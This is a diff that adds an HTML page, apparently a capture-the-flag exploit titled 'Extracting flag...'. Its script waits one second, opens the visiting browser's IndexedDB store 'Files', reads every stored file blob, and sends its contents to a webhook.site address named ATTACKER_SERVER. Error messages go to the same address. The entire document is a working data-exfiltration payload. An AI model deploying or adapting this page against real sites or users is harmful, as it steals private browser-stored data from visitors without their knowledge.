@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Extracting flag...</h1>
+  <script>
+    const ATTACKER_SERVER = "https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23/";
+
+    setTimeout(() => { // انتظر قليلاً للتأكد من أن كل شيء جاهز
+      try {
+        const dbrequest = indexedDB.open("Files", 1);
+        dbrequest.onsuccess = () => {
+          const db = dbrequest.result;
+          if (!db.objectStoreNames.contains("files")) {
+            fetch(`${ATTACKER_SERVER}?error=final_attempt_no_files_store`);
+            return;
+          }
+          const transaction = db.transaction("files", "readonly");
+          const filesStore = transaction.objectStore("files");
+          const getAllRequest = filesStore.getAll();
+          getAllRequest.onsuccess = () => {
+            getAllRequest.result.forEach(obj => {
+              if (obj.file && obj.file instanceof Blob) {
+                obj.file.text().then(text => {
+                  fetch(`${ATTACKER_SERVER}?flag=${encodeURIComponent(text)}`);
+                });
+              }
+            });
+          };
+        };
+      } catch(e) {
+          fetch(`${ATTACKER_SERVER}?error=${encodeURIComponent(e.toString())}`);
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
